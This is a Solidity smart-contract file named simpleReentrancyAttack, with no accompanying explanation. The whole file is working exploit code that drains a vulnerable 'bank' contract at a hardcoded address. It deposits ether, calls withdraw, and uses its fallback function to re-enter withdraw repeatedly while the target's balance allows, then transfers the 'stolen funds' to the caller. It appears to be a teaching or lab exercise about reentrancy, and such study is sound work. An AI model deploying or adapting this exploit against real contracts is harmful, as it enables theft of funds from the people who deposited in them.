// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.10;

//1r deposit
//2n attack
//3r retrievevalues

interface targetInterface {
    function deposit() external payable;
    function withdraw(uint256 withdrawAmount) external;
}

contract simpleReentrancyAttack {
    targetInterface bankAddress =
        targetInterface(0xd9145CCE52D386f254917e481eB44e9943F39138);
    uint256 amount = 1 ether;
    uint256 amountDeposited = 0;

    function deposit() public payable {
        bankAddress.deposit.value(amountDeposited)();
    }

    function attack() public payable {
        amountDeposited = msg.value;
        deposit();
        bankAddress.withdraw(amountDeposited);
        retrieveStolenFunds();
    }

    function retrieveStolenFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    function getTargetBalance() public view returns (uint256) {
        return address(bankAddress).balance;
    }

    fallback() external payable {
        if (address(bankAddress).balance >= amountDeposited) {
            bankAddress.withdraw(amountDeposited);
        }
    }
}
